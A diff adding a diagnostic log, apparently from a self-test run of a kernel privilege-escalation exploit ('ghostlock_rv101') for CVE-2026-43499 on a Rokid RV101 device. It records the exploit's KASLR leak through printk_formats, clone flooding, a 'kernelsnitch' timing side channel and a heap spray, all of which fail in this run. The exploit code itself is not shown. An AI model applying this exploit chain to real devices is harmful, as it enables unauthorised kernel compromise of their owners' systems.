@@ -1,0 +1,51 @@
+=== selftest fork-limit diag 11:49:24 uptime=770 ===
+[+] ghostlock_rv101 v9.30 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=19824 uid=2000 euid=2000 gid=2000
+[*] [T+770189ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffdb5a42ac0c slide=0x0000001b50800000
+[*] printk_formats: "Function call interrupts" -> 0xffffffdb5a4ca100 slide=0x0000001b50800000
+[+] KASLR: slide=0x0000001b50800000 base=0xffffffdb58800000 (2 anchors)
+[*] selftest run 1/1
+[*] === SELFTEST: write into sprayed page === target=0x0000000000000000 mode=3 delta=+0
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.55 fork-limit: RLIMIT_NPROC=6608/6608 loadavg=3.98 25.66 17.60 39/7839 21912
+ threads-max=13217
+ pid_max=32768
+ /proc entries=2254 errno=0 Success
+[*] v9.13 diag: dummy clones ok=78 fail=372 (first errno=11 Try again)
+[*] v9.15 diag: purge clones ok=0 fail=0
+[*] kernelsnitch: ks_increase 4096 threads, 3485 failed (first err=11)
+Threads:	612
+[*]   collision[1]: 0000005fdcfdc8b0 (t=858, ratio=171)
+[*]   collision[2]: 0000005fdd1ad738 (t=1001, ratio=200)
+[*]   collision[3]: 0000005fdd2b5f78 (t=864, ratio=172)
+[*] kernelsnitch: top times: 1001 864 858 20 19 19 19 19
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=1024 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=2048 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=512 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x3c0 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x400 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x380 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x440 single_matches=0 mm=-
+[*] kernelsnitch: hashsize=4096 sz=0x480 single_matches=0 mm=-
+[*] kernelsnitch: elapsed 1030ms mm=0000000000000000
+[-] kernelsnitch mm leak failed (mm=0000000000000000 r=8)
+[-]   heap spray attempt 1/1 failed, retrying
+[!]   SELFTEST: write into sprayed page failed after 1 attempts
+[*] selftest run 1/1 done (hit=0)  [0/1 hits so far]
+[+] SELFTEST summary: 0/1 runs hit the STRICT signature
+=== end 11:49:27 ===
